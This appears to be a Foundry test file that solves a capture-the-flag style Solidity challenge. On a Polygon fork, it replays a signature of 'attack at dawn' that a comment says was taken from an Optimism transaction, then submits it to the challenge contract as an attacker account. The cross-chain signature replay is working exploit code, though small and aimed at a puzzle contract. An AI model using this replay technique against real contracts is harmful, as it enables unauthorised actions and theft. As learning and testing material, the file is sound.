// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

// import "@forgex-std/console2.sol";

import {Test} from "@forge-std/Test.sol";
import {ReuseSignature} from "@main/1_ReuseSignature.sol";

contract ReuseSignatureTest is Test {

    // using ECDSA for bytes32;

    string mnemonic = "test test test test test test test test test test test junk";
    // uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

    // address deployer = vm.addr(deployerPrivateKey);
    address attacker = vm.addr(attackerPrivateKey);

    uint256 polygonFork;
    string POLYGON_RPC_URL = vm.rpcUrl("POLYGON");

    ReuseSignature reuseSignature;

    function setUp() public {
        polygonFork = vm.createFork(POLYGON_RPC_URL);
       
        reuseSignature = ReuseSignature(0xa94a3AB66FaBc6e9F672924a76587c16322752E9);
    }

    function testFork_isSolved() public {
        vm.startPrank(attacker);
        vm.selectFork(polygonFork);
         // block at 42370728
        vm.rollFork(42370800);

        // replay attack regarding to Optimism Chain : https://optimistic.etherscan.io/tx/0x08e18539b6a2b45c74aa3eb4bc769a173baf87b3373437123c9498d72f02c2e2
        string memory message = "attack at dawn";
        bytes memory signature = hex"e5d0b13209c030a26b72ddb84866ae7b32f806d64f28136cb5516ab6ca15d3c438d9e7c79efa063198fda1a5b48e878a954d79372ed71922003f847029bf2e751b";

        reuseSignature.challenge(message, signature);

        vm.stopPrank();
    }

}